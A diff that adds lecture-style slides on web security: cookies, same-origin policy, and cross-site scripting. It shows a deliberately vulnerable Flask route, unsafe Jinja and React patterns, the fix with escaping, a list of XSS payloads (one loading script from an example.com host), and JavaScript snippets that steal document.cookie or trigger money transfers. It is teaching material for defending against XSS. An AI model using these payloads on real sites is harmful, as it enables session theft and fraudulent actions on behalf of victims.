@@ -322,8 +322,152 @@ select * from sqlite_master where type='table';
 
 ---
 
-## js
+## [cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies) (review)
+
+---
+
+## [same origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)
 
 ---
 
 ## xss
+
+---
+
+BAD!
+
+
+```py
+innocent = "something"
+
+@app.route("/")
+def post():
+    para = innocent # user-controlled; retrieved from db
+    return f"<p>{para}</p>"
+```
+
+XSS:
+
+```py
+evil = "😇</p><script>alert('xss')</script><p>heh"
+
+@app.route("/")
+def post():
+    para = evil
+    return f"<p>{para}</p>"
+```
+
+---
+
+also bad:
+
+- flask (jinja):
+
+    ```html
+    <p>{{ para | safe }}</p>
+    ```
+
+- react:
+
+    ```jsx
+    <div dangerouslySetInnerHTML={{ __html: para }} />
+    ```
+
+- …
+
+---
+
+solution: escaping!
+
+problems:
+
+- browser html parsers are lenient af.
+- escaping hard.
+
+---
+
+solution: let your programming language do the escaping.
+
+```py
+import html
+
+@app.route("/")
+def post():
+    return f"<p>{html.escape(evil)}</p>"
+```
+
+result:
+
+```html
+<p>😇&lt;/p&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&lt;p&gt;heh</p>
+```
+
+---
+
+### xss payloads
+
+- `<script>alert('xss')</script>`
+- `<script src="https://example.com/evil.js"></script>`
+- `<img src="https://example.com/evil.png" onerror="alert('xss')">`
+- `<a href="javascript:alert('xss')">click me</a>`
+- `<svg onload="alert('xss')">`
+- […](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
+
+<!-- escaping hard. -->
+
+---
+
+- reflected
+- stored
+
+---
+
+### why is xss so bad?
+
+- nuisance
+- cookie theft
+- perform actions on behalf of other users (including privileged ones)
+
+---
+
+### js payloads for "impersonation"
+
+```js
+fetch('/transfer/moniez?recipient=me')
+```
+
+```js
+fetch('/transfer/moniez', {
+    method: 'POST',
+    body: JSON.stringify({
+        recipient: 'me',
+    }),
+});
+```
+
+---
+
+### js payloads for cookie theft
+
+```js
+fetch(`/post?text=${document.cookie}`);
+```
+
+```js
+fetch('/post', {
+    method: 'POST',
+    body: JSON.stringify({
+        text: document.cookie,
+    }),
+});
+```
+
+```js
+let data = new FormData();
+data.append('query', document.cookie);
+
+fetch('/post', {
+    method: 'POST',
+    body: data,
+});
+```
